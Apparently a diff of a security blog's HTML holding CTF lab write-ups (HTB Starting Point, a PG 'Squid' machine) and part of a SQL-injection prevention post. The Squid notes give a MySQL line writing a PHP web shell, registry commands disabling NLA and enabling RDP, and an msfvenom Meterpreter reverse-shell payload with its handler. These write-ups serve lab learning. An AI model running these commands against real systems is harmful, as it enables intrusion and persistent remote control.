+<div class="highlight"><pre><span></span><code><span class="n">PreparedStatement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="n">prepareStatement</span><span class="p">(</span><span class="s">&quot;SELECT * FROM products WHERE category = ?&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">statement</span><span class="p">.</span><span class="n">setString</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">);</span>
+<span class="w">    </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="n">executeQuery</span><span class="p">();</span>
+</code></pre></div>
+
+<p>Parameterized queries can be used for any situation where untrusted input appears as data within the query, including the ==WHERE== clause and values in an ==INSERT== or ==UPDATE== statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the ==ORDER BY== clause. Application functionality that places untrusted data into those parts of the query will need to take a different approach, such as white-listing permitted input values, or using different logic to deliver the required behavior.
+For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It is all too easy to make mistakes about the possible origin of data, or for changes in other code to violate assumptions about what data is tainted.</p>
+<blockquote>
+<p>Read more
+* <a href="https://portswigger.net/burp/vulnerability-scanner">Find SQL injection vulnerabilities using Burp Suite's web vulnerability scanner</a></p>
+</blockquote>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sql-injection/">posted at 20:48</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/portswigger.html" rel="tag">PortSwigger</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/dancing/" rel="bookmark" title="Permanent Link to &quot;Dancing Machine&quot;">Dancing Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>Dancing Machine</h1>
+<h1>HTB/STARTING_POINT</h1>
+<p>In this machine we learn to enumerate SMB file shares.</p>
+<h3>To list shares</h3>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//&lt;serverIP/name&gt;<span class="w"> </span>-N
+</code></pre></div>
+
+<h3>To download all file to a backup file become handing when u have a large file system</h3>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>smbclient<span class="w"> </span>//&lt;serverIP/name&gt;/&lt;shareDisk&gt;<span class="w"> </span>-N<span class="w"> </span>-Tc<span class="w"> </span>backup.tar
 </code></pre></div>
                 <div class="clear"></div>
 
                 <div class="info">
-                    <a href="https://sfinx.kozow.com/active-enumeration.html">posted at 21:00</a>
-                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/oscp.html" rel="tag">OSCP</a>
+                    <a href="https://sfinx.kozow.com/2024/5/19/dancing/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/explosion/" rel="bookmark" title="Permanent Link to &quot;Explosion Machine&quot;">Explosion Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>Explosion</h1>
+<h1>HTB/STARTING_POINT</h1>
+<p>This machine teach you how to interact with RDP protocol and enumerate it .</p>
+<p>Let’s start by map to scan all open ports, since this machine is focused on RDP , we will reduce time by specifying the port on 3389 ;</p>
+<div class="highlight"><pre><span></span><code>
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/explosion/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/redeemer/" rel="bookmark" title="Permanent Link to &quot;Redeemer Machine&quot;">Redeemer Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>Redeemer</h1>
+<h1>HTB/STARTING_POINT</h1>
+<p>This machine show you how to interact with a Redis server .</p>
+<p>Doing Nmap scan show open port and specifically redid port open on :</p>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-T4<span class="w"> </span>-p-<span class="w"> </span>-oA<span class="w"> </span>nmap/Redeemer<span class="w"> </span>&lt;serverIp&gt;
+</code></pre></div>
+
+<p>Result :</p>
+<div class="highlight"><pre><span></span><code><span class="gp"># </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span>scan<span class="w"> </span>initiated<span class="w"> </span>Thu<span class="w"> </span>Aug<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">02</span>:07:23<span class="w"> </span><span class="m">2023</span><span class="w"> </span>as:<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-T4<span class="w"> </span>-p-<span class="w"> </span>-oA<span class="w"> </span>nmap/Redeemer<span class="w"> </span><span class="m">10</span>.129.6.102
+<span class="go">Warning: 10.129.6.102 giving up on port because retransmission cap hit (6).</span>
+<span class="go">Nmap scan report for 10.129.6.102</span>
+<span class="go">Host is up (0.11s latency).</span>
+<span class="go">Not shown: 65526 closed tcp ports (conn-refused)</span>
+<span class="go">PORT      STATE    SERVICE VERSION</span>
+<span class="go">6379/tcp  open     redis   Redis key-value store 5.0.7</span>
+<span class="go">23201/tcp filtered unknown</span>
+<span class="go">23819/tcp filtered unknown</span>
+<span class="go">25153/tcp filtered unknown</span>
+<span class="go">34008/tcp filtered unknown</span>
+<span class="go">35903/tcp filtered unknown</span>
+<span class="go">39049/tcp filtered unknown</span>
+<span class="go">40140/tcp filtered unknown</span>
+<span class="go">47535/tcp filtered unknown</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="gp"># </span>Nmap<span class="w"> </span><span class="k">done</span><span class="w"> </span>at<span class="w"> </span>Thu<span class="w"> </span>Aug<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">02</span>:25:02<span class="w"> </span><span class="m">2023</span><span class="w"> </span>--<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1059</span>.07<span class="w"> </span>seconds
+</code></pre></div>
+
+<p>Connect to redis ;</p>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>redis-cli<span class="w"> </span>-h<span class="w"> </span>&lt;hostname/ip&gt;
+</code></pre></div>
+
+<p>Get all db ;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>config<span class="w"> </span>get<span class="w"> </span>databases
+</code></pre></div>
+
+<p>Get existed keys with correspond db index;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>info<span class="w"> </span>keyspace<span class="w"> </span>
+</code></pre></div>
+
+<p>Select desired db;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>&lt;N&gt;
+</code></pre></div>
+
+<p>Get info on Redis server;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>info
+</code></pre></div>
+
+<p>Dump all keys;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>keys<span class="w"> </span>*
+</code></pre></div>
+
+<p>Get random keys;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>randomkey<span class="w"> </span>
+</code></pre></div>
+
+<p>Print specified key value;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>get<span class="w"> </span>&lt;keyname&gt;
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/redeemer/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/squid/" rel="bookmark" title="Permanent Link to &quot;Squid Machine&quot;">Squid Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>SQUID - MACHINE / PG</h1>
+<h1>PG/easy_windows</h1>
+<p>This machine a proxy named squid that proxy all network traffic from outside . It operate on port 3128</p>
+<h4>Mysql 3306:</h4>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="ss">&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="ss">&quot;C:\\xampp\\htdocs\\backdoor.php&quot;</span>
+</code></pre></div>
+
+<h4>Disable NLA;</h4>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>add<span class="w"> </span><span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&quot;</span><span class="w"> </span>/v<span class="w"> </span>UserAuthentication<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="w"> </span>/f
+</code></pre></div>
+
+<h4>Enable RDP on owned machine:</h4>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>add<span class="w"> </span><span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><span class="w"> </span>/v<span class="w"> </span>fDenyTSConnections<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="m">0</span><span class="w"> </span>/f
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>netsh<span class="w"> </span>advfirewall<span class="w"> </span>firewall<span class="w"> </span><span class="nb">set</span><span class="w"> </span>rule<span class="w"> </span><span class="nv">group</span><span class="o">=</span><span class="s2">&quot;remote desktop&quot;</span><span class="w"> </span>new<span class="w"> </span><span class="nv">enable</span><span class="o">=</span>yes
+</code></pre></div>
+
+<h4>Reverse Shell with Meterpreter:</h4>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.0.17<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>--format<span class="o">=</span>exe<span class="w"> </span>&gt;<span class="w"> </span>evil.exe
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>msf5&gt;<span class="w"> </span>use<span class="w"> </span>exploit/multi/handler
+msf5&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
+msf5&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.0.17
+msf5&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+msf5&gt;<span class="w"> </span>run
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/squid/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
                 </div>
             </article>
 
